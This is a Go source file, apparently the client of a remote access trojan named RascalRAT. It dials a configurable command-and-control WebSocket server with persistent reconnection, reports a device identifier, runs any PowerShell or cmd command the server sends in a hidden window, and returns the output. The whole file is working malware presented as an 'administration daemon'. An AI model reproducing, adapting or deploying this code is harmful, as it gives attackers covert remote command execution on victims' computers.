package main

import (
	"context"
	"log/slog"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/its-ernest/RascalRAT/internal/protocol"

	"github.com/coder/websocket"
	"github.com/coder/websocket/wsjson"
)

const (
	// DefaultServerBase is the fallback C2 base domain (no path / id). The
	// client appends the connection route and its own device identity.
	DefaultServerBase = "ws://localhost:8080"
	ConfigFileName    = "config.txt"
)

func runMainApplication() {
	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelDebug}))
	slog.SetDefault(logger)

	slog.Info("initializing administration daemon...")

	serverURL := resolveServerURL()

	const (
		baseDelay = 2 * time.Second
		maxDelay  = 5 * time.Minute
	)

	// Persistent network connectivity loop with exponential backoff.
	// Backoff grows when the upstream is unreachable, and resets to the
	// base delay whenever a connection was actually established (then later
	// dropped), so a transient disconnect recovers quickly.
	backoff := baseDelay
	for {
		slog.Info("attempting connection upstream", "url", serverURL)
		connected, err := establishControlLine(serverURL)
		if err != nil {
			if connected {
				slog.Error("control line dropped, reconnecting immediately", "err", err)
				backoff = baseDelay
			} else {
				slog.Error("control line handshake failed, retrying with backoff", "err", err, "delay", backoff)
			}
			time.Sleep(backoff)
			backoff *= 2
			if backoff > maxDelay {
				backoff = maxDelay
			}
			continue
		}
		backoff = baseDelay
	}
}

// resolveServerBase returns the C2 base domain. config.txt is expected to
// contain ONLY the base (e.g. "https://example.com"); a runtime override file
// beside the executable takes precedence, otherwise the bundled config, and
// finally the hardcoded default base.
func resolveServerBase() string {
	if data, err := os.ReadFile(ConfigFileName); err == nil {
		if base := strings.TrimSpace(string(data)); base != "" {
			slog.Info("using base domain from local override configuration file")
			return base
		}
		slog.Warn("local configuration file empty, falling back to bundled config")
	} else {
		slog.Debug("no local configuration file present, using bundled configuration", "err", err)
	}

	base := strings.TrimSpace(string(embeddedConfig))
	if base == "" {
		slog.Warn("bundled configuration empty, reverting to default base")
		return DefaultServerBase
	}
	return base
}

// resolveServerURL assembles the full WebSocket endpoint by appending the
// connection route and the client's own device identity to the base domain.
func resolveServerURL() string {
	base := strings.TrimRight(resolveServerBase(), "/")

	// Tolerate legacy config entries that already embed the full path.
	if strings.Contains(base, "/ws/connect") {
		return base
	}

	deviceID := systemIdentifier()
	full := base + "/ws/connect?id=" + url.QueryEscape(deviceID)
	slog.Info("resolved upstream endpoint", "device_id", deviceID, "url", full)
	return full
}

// establishControlLine dials the upstream and processes tasks until the
// connection ends. The returned bool reports whether the dial itself
// succeeded, allowing the caller to distinguish an unreachable upstream
// from a connection that was established and later dropped.
func establishControlLine(urlStr string) (bool, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	header := http.Header{}
	header.Add("localtonet-skip-warning", "true")

	opts := &websocket.DialOptions{HTTPHeader: header}
	conn, _, err := websocket.Dial(ctx, urlStr, opts)
	if err != nil {
		return false, err
	}
	defer conn.Close(websocket.StatusNormalClosure, "daemon terminating connection")

	slog.Info("established connection pipeline with control plane")
	return true, runExecutionProcessor(context.Background(), conn)
}

func runExecutionProcessor(ctx context.Context, conn *websocket.Conn) error {
	conn.SetReadLimit(1024 * 1024 * 4) // 4MB constraint

	for {
		var taskRequest protocol.TaskRequest
		if err := wsjson.Read(ctx, conn, &taskRequest); err != nil {
			return err
		}

		slog.Info("received administrative task instruction", "task_id", taskRequest.TaskID)
		go executeAndReply(ctx, conn, taskRequest)
	}
}

func executeAndReply(ctx context.Context, conn *websocket.Conn, task protocol.TaskRequest) {
	startTime := time.Now()

	execCtx, cancel := context.WithTimeout(ctx, task.Timeout)
	defer cancel()

	var cmd *exec.Cmd
	switch strings.ToLower(task.PayloadType) {
	case "powershell":
		cmd = exec.CommandContext(execCtx, "powershell.exe", "-NoProfile", "-NonInteractive", "-Command", task.ScriptBlock)
	default:
		cmd = exec.CommandContext(execCtx, "cmd.exe", "/c", task.ScriptBlock)
	}

	applyHiddenWindow(cmd)

	// CombinedOutput safely captures both stdout and stderr into a single slice natively
	outputBytes, err := cmd.CombinedOutput()

	response := protocol.TaskResponse{
		TaskID:   task.TaskID,
		Success:  err == nil,
		Stdout:   string(outputBytes),
		Duration: time.Since(startTime),
	}

	if err != nil {
		response.ErrorMessage = err.Error()
		if exitError, ok := err.(*exec.ExitError); ok {
			response.ExitCode = exitError.ExitCode()
		} else {
			response.ExitCode = 1
		}
	}

	shipResponse(ctx, conn, response)
}

func shipResponse(ctx context.Context, conn *websocket.Conn, resp protocol.TaskResponse) {
	writeCtx, cancel := context.WithTimeout(ctx, 5*time.Second)
	defer cancel()

	if err := wsjson.Write(writeCtx, conn, resp); err != nil {
		slog.Error("failed to write response to websocket line", "err", err)
	}
}
